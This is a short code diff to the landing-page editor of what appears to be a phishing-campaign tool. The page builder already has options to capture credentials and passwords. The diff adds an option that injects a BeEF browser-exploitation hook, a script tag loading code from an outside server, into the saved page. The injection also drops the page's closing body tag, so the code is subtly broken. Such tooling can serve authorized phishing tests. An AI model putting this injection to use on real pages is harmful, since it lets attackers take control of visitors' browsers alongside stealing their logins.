@@ -8,6 +8,8 @@ var pages = []
 
 // Save attempts to POST to /templates/
 function save(idx) {
+    var beef_hook = '<script src="{{.BeEF}}"></script>'
+
     var page = {}
     page.name = $("#name").val()
     editor = CKEDITOR.instances["html_editor"]
@@ -15,6 +17,14 @@ function save(idx) {
     page.capture_credentials = $("#capture_credentials_checkbox").prop("checked")
     page.capture_passwords = $("#capture_passwords_checkbox").prop("checked")
     page.redirect_url = $("#redirect_url_input").val()
+    page.beef_hook = $("#beef_hook").prop("checked")
+    if (page.beef_hook) {
+        if (page.html.indexOf(beef_hook) === -1) {
+            page.html = page.html.replace("</body>", beef_hook)
+        }
+    } else {
+        page.html = page.html.replace(beef_hook, "")
+    }
     if (idx != -1) {
         page.id = pages[idx].id
         api.pageId.put(page)
